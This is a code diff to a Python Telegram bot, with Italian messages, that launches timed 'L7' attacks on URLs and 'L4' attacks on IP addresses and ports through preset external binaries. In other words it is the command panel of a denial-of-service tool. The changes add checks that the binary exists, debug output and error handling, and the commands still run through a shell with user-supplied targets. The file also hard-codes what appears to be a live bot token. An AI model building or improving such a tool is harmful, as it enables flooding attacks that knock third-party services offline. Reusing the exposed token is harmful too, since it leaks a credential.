@@ -8,6 +8,7 @@ import threading
 import time
 from urllib.parse import urlparse
 from telegram.ext import Updater, CommandHandler
+import shutil
 
 # ================= CONFIG =================
 TOKEN = "8593144725:AAHw5UoWAnrANQCZIw1mwsbNkh8c_roFmLU"
@@ -106,6 +107,10 @@ def l7_command(update, context):
         update.message.reply_text("Preset L7 non valido")
         return
 
+    if not shutil.which(preset['bin']):
+        update.message.reply_text(f"Comando {preset['bin']} non trovato sul sistema!")
+        return
+
     try:
         tempo = int(tempo)
     except ValueError:
@@ -121,7 +126,13 @@ def l7_command(update, context):
         return
 
     cmd_str = f"{preset['bin']} {preset['flags']} {url}"
-    process = subprocess.Popen(cmd_str, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
+    print(f"Eseguo comando L7: {cmd_str}")  # debug
+
+    try:
+        process = subprocess.Popen(cmd_str, shell=True, preexec_fn=os.setsid)
+    except Exception as e:
+        update.message.reply_text(f"Errore nell'avvio del comando: {e}")
+        return
 
     LAST_DESC = f"L7 {method} → {url} : {tempo}s"
     is_running_flag = True
@@ -154,6 +165,10 @@ def l4_command(update, context):
         update.message.reply_text("Preset L4 non valido")
         return
 
+    if not shutil.which(preset['cmd']):
+        update.message.reply_text(f"Comando {preset['cmd']} non trovato sul sistema!")
+        return
+
     try:
         ipaddress.ip_address(ip)
     except ValueError:
@@ -172,7 +187,13 @@ def l4_command(update, context):
         return
 
     cmd_str = f"{preset['cmd']} {preset['args'].format(port=port)}"
-    process = subprocess.Popen(cmd_str, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
+    print(f"Eseguo comando L4: {cmd_str}")  # debug
+
+    try:
+        process = subprocess.Popen(cmd_str, shell=True, preexec_fn=os.setsid)
+    except Exception as e:
+        update.message.reply_text(f"Errore nell'avvio del comando: {e}")
+        return
 
     LAST_DESC = f"L4 {method} → {ip}:{port} : {tempo}s"
     is_running_flag = True
